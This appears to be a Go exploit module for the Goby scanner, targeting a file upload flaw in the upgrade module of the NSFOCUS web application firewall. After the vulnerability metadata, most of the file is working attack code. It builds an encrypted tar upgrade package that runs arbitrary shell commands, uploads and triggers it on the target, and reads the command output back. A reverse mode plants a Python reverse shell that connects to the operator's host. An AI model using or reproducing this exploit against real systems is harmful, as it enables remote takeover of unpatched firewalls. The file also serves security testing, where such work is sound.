package exploits

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"io"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "NSFOCUS WAF upgrade module file upload vulnerability",
    "Description": "<p>NSFOCUS Web Application Firewall (NSFOCUS WAF) provides an intelligent protection model integrating static rules and dynamic syntax and semantic analysis to protect website applications from known and unknown attacks; based on the user's perspective, it provides local and cloud unified management solutions; an open product Full API capabilities, flexible integration with various security platforms, and solution to the needs of customers of different sizes.</p><p>There is a file upload vulnerability in the upgrade module of NSFOCUS Web Application Firewall (NSFOCUS WAF). An attacker can use this vulnerability to write a backdoor on the server side, obtain server permissions, and then control the entire web server.</p>",
    "Product": "NSFOCUS-WAF",
    "Homepage": "http://www.nsfocus.com.cn/",
    "DisclosureDate": "2024-02-19",
    "PostTime": "2024-02-22",
    "Author": "2737977997@qq.com",
    "FofaQuery": "(title==\"WAF NSFOCUS\" && body=\"/images/logo/nsfocus.png\") || (cert=\"Email Address: liuzhixu@intra.nsfocus.com \" && cert=\"CommonName: WAFG2\") || header=\"NSFOCUS VMWAF\" || banner=\"NSFOCUS VMWAF\"",
    "GobyQuery": "(title==\"WAF NSFOCUS\" && body=\"/images/logo/nsfocus.png\") || (cert=\"Email Address: liuzhixu@intra.nsfocus.com \" && cert=\"CommonName: WAFG2\") || header=\"NSFOCUS VMWAF\" || banner=\"NSFOCUS VMWAF\"",
    "Level": "3",
    "Impact": "<p>There is a file upload vulnerability in the upgrade module of NSFOCUS Web Application Firewall (NSFOCUS WAF). An attacker can use this vulnerability to write a backdoor on the server side, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. The manufacturer has released a solution, please update to the latest version: <a href=\"http://update.nsfocus.com/update/listWafV67Detail/v/sys6070\">http://update.nsfocus.com/update/listWafV67Detail/v/sys6070</a></p><p>2. Set access policies through security devices such as firewalls and set whitelist access.</p><p>3. If necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        "CNVD-2024-07088"
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "绿盟 Web 应用防火墙 upgrade 模块文件上传漏洞",
            "Product": "NSFOCUS-WAF",
            "Description": "<p>绿盟 Web 应用防火墙（NSFOCUS WAF），提供静态规则、动态语法语义分析为一体的智慧防护模型，保障网站应用免受已知、未知攻击；基于用户视角，提供本地、云端统一管理方案；开放产品全API化能力，灵活对接各种安全平台，解决不同规模客户使用需求。</p><p>绿盟 Web 应用防火墙（NSFOCUS WAF）upgrade 模块存在文件上传漏洞，攻击者可通过该漏洞在服务器端写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>1、厂商已发布解决方案，请更新到最新版本：<a href=\"http://update.nsfocus.com/update/listWafV67Detail/v/sys6070\">http://update.nsfocus.com/update/listWafV67Detail/v/sys6070</a></p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>3、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>绿盟 Web 应用防火墙（NSFOCUS WAF）upgrade 模块存在文件上传漏洞，攻击者可通过该漏洞在服务器端写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "NSFOCUS WAF upgrade module file upload vulnerability",
            "Product": "NSFOCUS-WAF",
            "Description": "<p>NSFOCUS Web Application Firewall (NSFOCUS WAF) provides an intelligent protection model integrating static rules and dynamic syntax and semantic analysis to protect website applications from known and unknown attacks; based on the user's perspective, it provides local and cloud unified management solutions; an open product Full API capabilities, flexible integration with various security platforms, and solution to the needs of customers of different sizes.</p><p>There is a file upload vulnerability in the upgrade module of NSFOCUS Web Application Firewall (NSFOCUS WAF). An attacker can use this vulnerability to write a backdoor on the server side, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>1. The manufacturer has released a solution, please update to the latest version: <a href=\"http://update.nsfocus.com/update/listWafV67Detail/v/sys6070\">http://update.nsfocus.com/update/listWafV67Detail/v/sys6070</a></p><p>2. Set access policies through security devices such as firewalls and set whitelist access.</p><p>3. If necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>There is a file upload vulnerability in the upgrade module of NSFOCUS Web Application Firewall (NSFOCUS WAF). An attacker can use this vulnerability to write a backdoor on the server side, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10926"
}`
	var keyGDHA38ASD19 = []byte{
		0x4E, 0xC7, 0xE4, 0xDB, 0x6D, 0x12, 0x62, 0x90,
		0x0D, 0x9F, 0xE0, 0x7F, 0xF1, 0x18, 0xAF, 0x3E,
		0xEA, 0x9D, 0xF7, 0xE6, 0x0E, 0x10, 0xC2, 0x57,
		0x2A, 0x28, 0x2F, 0x7C, 0x00, 0x2B, 0x1B, 0xF0,
		0xD0, 0x29, 0x1D, 0x21, 0x3D, 0x11, 0x93, 0x29,
		0x0F, 0xCE, 0xB2, 0xC0, 0xBB, 0x3E, 0xD0, 0x38,
		0xB3, 0x3B, 0x91, 0xCB, 0x52, 0x79, 0x25, 0x74,
		0xF7, 0x19, 0xE6, 0xAA, 0xFB, 0xE7, 0x93, 0x96,
		0xFA, 0xE5, 0xB3, 0xDB, 0x85, 0xE0, 0x43, 0x5A,
		0x0C, 0xE9, 0xBB, 0xDA, 0x03, 0x96, 0xB3, 0xAF,
		0x0A, 0xF9, 0x28, 0x99, 0x7D, 0x37, 0xE0, 0xEE,
		0x7F, 0x84, 0x8D, 0x19, 0xB6, 0xD4, 0x54, 0x05,
		0xFA, 0xA2, 0x25, 0x03, 0xA4, 0xAA, 0xF5, 0x15,
		0x55, 0xEB, 0x9E, 0x0E, 0xE4, 0xE3, 0x28, 0xC4,
		0xFE, 0x41, 0xF0, 0x49, 0xE7, 0xCC, 0x57, 0x6A,
		0x3E, 0x1D, 0x2F, 0xF5, 0xF2, 0xFA, 0x04, 0x6E,
		0x5C, 0x4B, 0x2C, 0x94, 0xB1, 0x21, 0x30, 0xA0,
		0xF4, 0x01, 0xF3, 0x1E, 0x71, 0x90, 0x26, 0xAE,
		0xA8, 0x5A, 0xC6, 0x33, 0xA5, 0xF6, 0x56, 0xDD,
		0x93, 0x1A, 0xCD, 0x51, 0xD4, 0x78, 0x50, 0x46,
		0x36, 0x4A, 0xBB, 0x51, 0x5B, 0x2A, 0xB6, 0x14,
		0x14, 0xAF, 0xD6, 0x73, 0x52, 0x56, 0x84, 0x8C,
		0x29, 0xA8, 0xDE, 0x2C, 0x00, 0xA9, 0xEF, 0xA1,
		0x2A, 0x0E, 0xD5, 0x6F, 0x5C, 0xAD, 0x60, 0x1C,
		0x93, 0xCF, 0xE8, 0xCA, 0x55, 0xED, 0xCB, 0xE6,
		0xFB, 0xFF, 0xA6, 0x55, 0xE8, 0x34, 0xA6, 0x20,
		0x2E, 0x92, 0x5C, 0xD9, 0x3D, 0xB2, 0x45, 0x38,
		0x61, 0x00, 0xEB, 0x5D, 0xEA, 0x3D, 0xDB, 0xF6,
		0x89, 0xD8, 0xEB, 0x9F, 0xD2, 0x4F, 0x37, 0x1C,
		0xEB, 0xFD, 0x94, 0x60, 0xBA, 0xC1, 0xC3, 0xF3,
		0x1B, 0x0A, 0x08, 0x8F, 0x7A, 0x73, 0xF1, 0x2C,
		0xE4, 0x71, 0x60, 0x89, 0x1E, 0x9E, 0x9B, 0xB4,
	}
	initBoxGDHA38ASD19 := func(key []byte) []byte {
		sbox := make([]byte, 256)
		for i := range sbox {
			sbox[i] = byte(i)
		}
		j := 0
		for i := 0; i < 256; i++ {
			j = (j + int(sbox[i]) + int(key[i%len(key)])) % 256
			sbox[i], sbox[j] = sbox[j], sbox[i]
		}
		return sbox
	}
	encryptGDHA38ASD19 := func(plain []byte, sbox []byte) []byte {
		res := make([]byte, len(plain))
		i, j := 0, 0
		for index, s := range plain {
			i = (i + 1) % 256
			j = (j + int(sbox[i])) % 256
			sbox[i], sbox[j] = sbox[j], sbox[i]
			t := (int(sbox[i]) + int(sbox[j])) % 256
			k := sbox[t]
			res[index] = s ^ k
		}
		return res
	}
	encGDHA38ASD19 := func(buf []byte) []byte {
		sbox := initBoxGDHA38ASD19(keyGDHA38ASD19)
		encryptGDHA38ASD19(make([]byte, 0x161), sbox)
		return encryptGDHA38ASD19(buf, sbox)
	}

	// 生成tar文件
	generateTarFileGDHA38ASD19GDHA38ASD19 := func(executionData string) []byte {
		var buf bytes.Buffer
		gzipWriter := gzip.NewWriter(&buf)
		tarWriter := tar.NewWriter(gzipWriter)
		files := map[string]string{
			"info.xml":                  "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?>\n<file id=\"6.0.5.1.39331\">\n    <date>20180524</date>\n    <updatemsg>2</updatemsg>\n    <emerge>0</emerge>\n    <run><![CDATA[install.sh]]></run>\n    <info lang=\"zh_CN\"><![CDATA[x]]></info>\n    <info lang=\"en_US\"><![CDATA[English Info.]]></info>\n    <description lang=\"zh_CN\"><![CDATA[x]]></description>\n    <description lang=\"en_US\"><![CDATA[English Desc.]]></description>\n</file>",
			"update.v6.0.5.1.39331.waf": "?",
			"version.py":                "\nimport os\nos.system(\"\"\"" + executionData + "\"\"\")\nexit(-1)\n",
		}
		for filename, content := range files {
			header := &tar.Header{ // 创建tar文件默认这个tar和zip文件不一样，默认tar文件不设置权限会无法访问里面内容，没有权限访问
				Name:     filename,
				Size:     int64(len(content)),
				Mode:     0666,
				Typeflag: tar.TypeReg,
			}
			tarWriter.WriteHeader(header)                      // 写入头部到tar文件
			io.Copy(tarWriter, bytes.NewBufferString(content)) // 将内容写入tar文件
		}
		tarWriter.Close()  // 关闭tar.Writer
		gzipWriter.Close() // 关闭gzip.Writer
		return buf.Bytes()
	}
	// 文件上传执行
	uploadExecutionPkgRequestGDHA38ASD19 := func(hostInfo *httpclient.FixUrl, filePkg string) error {
		uploadPkgRequestConfig := httpclient.NewPostRequestConfig("/admin/upgrade/upgrade/login/cloudlogin")
		uploadPkgRequestConfig.FollowRedirect = false
		uploadPkgRequestConfig.VerifyTls = false
		uploadPkgRequestConfig.Timeout = 15
		uploadPkgRequestConfig.Header.Store("Referer", hostInfo.Scheme()+"://"+hostInfo.Hostname)
		uploadPkgRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary=1f0b9e11c9e769bf7207d1cc83518e62")
		uploadPkgRequestConfig.Data = "--1f0b9e11c9e769bf7207d1cc83518e62\r\nContent-Disposition: form-data; name=\"text\"\r\n\r\nupdate.v6.0.5.1.39333.bin\r\n--1f0b9e11c9e769bf7207d1cc83518e62\r\nContent-Disposition: form-data; name=\"upgrade[file]\"; filename=\"update.v6.0.5.1.39333.bin\"\r\nContent-Type: application/octet-stream\r\n\r\n" + filePkg + "\r\n--1f0b9e11c9e769bf7207d1cc83518e62--\r\n"
		if _, err := httpclient.DoHttpRequest(hostInfo, uploadPkgRequestConfig); err != nil {
			return err
		}
		executionPkgRequestConfig := httpclient.NewPostRequestConfig("/admin/upgrade/exeupgrade/login/cloudlogin")
		executionPkgRequestConfig.FollowRedirect = false
		executionPkgRequestConfig.VerifyTls = false
		executionPkgRequestConfig.Timeout = 15
		executionPkgRequestConfig.Header.Store("Referer", hostInfo.Scheme()+"://"+hostInfo.Hostname)
		executionPkgRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		executionPkgRequestConfig.Data = "upfilename=update.v6.0.5.1.39331.waf"
		if _, err := httpclient.DoHttpRequest(hostInfo, executionPkgRequestConfig); err != nil {
			return err
		}
		return nil
	}

	commandExecuteGDHA38ASD19 := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		// 执行结果写入到 yU7gVmWdXT.txt 文件里面
		if err := uploadExecutionPkgRequestGDHA38ASD19(hostInfo, string(encGDHA38ASD19(generateTarFileGDHA38ASD19GDHA38ASD19(cmd)))); err != nil {
			return nil, err
		}
		// 访问 yU7gVmWdXT.txt 文件内容
		getExecutionResultRequestConfig := httpclient.NewGetRequestConfig("/yU7gVmWdXT.txt")
		getExecutionResultRequestConfig.FollowRedirect = false
		getExecutionResultRequestConfig.VerifyTls = false
		getExecutionResultRequestConfig.Timeout = 15
		return httpclient.DoHttpRequest(hostInfo, getExecutionResultRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			checkString := goutils.RandomHexString(6)
			resp, _ := commandExecuteGDHA38ASD19(hostinfo, "rm -rf yU7gVmWdXT.txt && echo "+checkString+" > yU7gVmWdXT.txt")
			return resp != nil && strings.Contains(resp.RawBody, checkString)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "cmd" {
				if resp, err := commandExecuteGDHA38ASD19(expResult.HostInfo, goutils.B2S(stepLogs.Params["cmd"])+" > yU7gVmWdXT.txt 2>&1"); resp != nil && resp.StatusCode == 200 {
					expResult.Success = true
					expResult.Output = resp.RawBody
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = "漏洞利用失败"
				}
			} else if attackType == "reverse" {
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh)
				if err != nil {
					expResult.Success = false
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				uploadExecutionPkgRequestGDHA38ASD19(expResult.HostInfo, string(encGDHA38ASD19(generateTarFileGDHA38ASD19GDHA38ASD19(`nohup python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("`+godclient.GetGodServerHost()+`",`+rp+`));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' &`))))
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						return expResult
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = `漏洞利用失败`
				}
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
